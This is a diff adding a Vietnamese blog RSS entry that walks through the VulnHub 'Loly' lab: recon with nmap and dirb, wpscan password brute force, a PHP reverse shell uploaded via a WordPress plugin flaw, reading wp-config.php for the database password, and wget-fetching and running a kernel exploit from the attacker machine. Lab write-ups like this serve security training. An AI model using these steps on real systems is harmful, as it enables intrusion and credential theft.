@@ -284,5 +284,81 @@ Thay vì <code>inject</code> một câu lệnh để server thực hiện sau kh
 <p>Tải file <code>flag.txt</code> về ta được flag: <code>CHH{b48Y_CUrl_CrAwl3r_1c7ddee4c53dfc5fc952c63ca0aebb9a}</code></p>
 ]]></description>
 </item>
+<item>
+    <title>Vulhub - Loly</title>
+    <link>https://g03m0n.github.io/posts/vulhub-loly/vulhub-loly/</link>
+    <pubDate>Sun, 20 Aug 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/vulhub-loly/vulhub-loly/</guid>
+    <description><![CDATA[<h2 id="description">Description</h2>
+<p>Link lab tại <a href="https://www.vulnhub.com/entry/loly-1,538/" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="step">Step</h2>
+<h3 id="reconnaissance">Reconnaissance</h3>
+<p>Đầu tiên ta sử dụng <code>arp-scan</code> để quét các địa chỉ IP có trong dải mạng.
+Nhận thấy có một IP lạ là <code>192.168.134.135</code>.</p>
+<p></p>
+<p>Sử dụng <code>nmap</code> để kiểm tra các dịch vụ đang mở trên IP đó</p>
+<p></p>
+<p>Nhận thấy cổng <code>80</code> đang mở và đang sử dụng <code>nginx 1.10.3</code>.</p>
+<p></p>
+<h3 id="enumeration">Enumeration</h3>
+<p>Tiến hành quét các <code>directory</code> bằng <code>dirb</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">dirb</span> <span style="color:#ae81ff">192.168</span><span style="color:#f92672">.</span><span style="color:#ae81ff">134.135</span>
+</span></span></code></pre></div><p></p>
+<p>Ta thu được kết quả trang web này sử dụng Wordpress tại endpoint <code>/wordpress</code>.</p>
+<p></p>
+<p>Giao diện chính của trang:</p>
+<p></p>
+<p>Giao diện <code>login</code>:</p>
+<p></p>
+<p>Tiến hành <code>brute force</code> username/password bằng cách sử dụng <code>wpscan</code>
+Đầu tiên là tìm <code>username</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>wpscan <span style="color:#f92672">-</span>url http:<span style="color:#75715e">//loly.lc/wordpress</span>
+</span></span></code></pre></div><p></p>
+<p>Ta thu được username là <code>loly</code>.</p>
+<p></p>
+<p><code>Brute force</code> password bằng query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>wpscan <span style="color:#f92672">-</span>url http:<span style="color:#75715e">//loly.lc/wordpress -U loly -P /usr/share/wordlists/rockyou.txt</span>
+</span></span></code></pre></div><p></p>
+<p>Thu được mật khẩu: <code>fernando</code>
+Tiến hành đăng nhập</p>
+<p></p>
+<h3 id="exploitation">Exploitation</h3>
+<p>Đây là giao diện chính của trang web:</p>
+<p></p>
+<p>Ta có thể thấy trang web sử dụng 1 <code>plugin</code> có tên là <code>AdRotale</code> version 5.8.6.2. Version này cho phép người dùng <code>upload</code> file zip và giải nén mà không có bất kỳ một phương thức kiểm tra nào:</p>
+<p></p>
+<p>Ta có thể tận dụng lỗ hổng này để upload <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener noreffer">reverse-shell</a>
+.
+Mở cổng 9001 trên máy attacker bằng query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>nc <span style="color:#f92672">-</span>nvlp 9001
+</span></span></code></pre></div><p>Bây giờ, truy cập PHP reverse shell bằng cách load lại trang web như hình dưới đây:</p>
+<p></p>
+<p>Thành công</p>
+<p></p>
+<p>Có thể nâng cấp shell này python <code>pty</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">python3</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">c</span> <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><p></p>
+<p>Sau đó thử <code>grep</code> với từ khóa <code>loly</code> ta tìm được mật khẩu DB có trong file <code>wp-config.php</code> là <code>lolyisabeautifulgirl</code></p>
+<p></p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>Đầu tiên, ta thử kiểm tra phiên bản <code>kernel</code> của machine</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">uname</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">a</span>
+</span></span></code></pre></div><p></p>
+<p>Đây là một phiên bản khá cũ, thử tìm mã khai thác trên google thì thấy một mã khai thác trên <code>exploit-db</code>:</p>
+<p></p>
+<p>Ta <code>wget</code> nó về và <code>compile</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>wget http:<span style="color:#75715e">//192.168.134.134:8000/ex.c</span>
+</span></span><span style="display:flex;"><span>gcc ex.<span style="color:#a6e22e">c</span> <span style="color:#f92672">-</span>o ex
+</span></span><span style="display:flex;"><span>chmod 777 ex
+</span></span></code></pre></div><p>
+
+</p>
+<p>Thực thi file <code>ex</code> bằng query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>.<span style="color:#f92672">/</span>ex
+</span></span></code></pre></div><p></p>
+]]></description>
+</item>
 </channel>
 </rss>
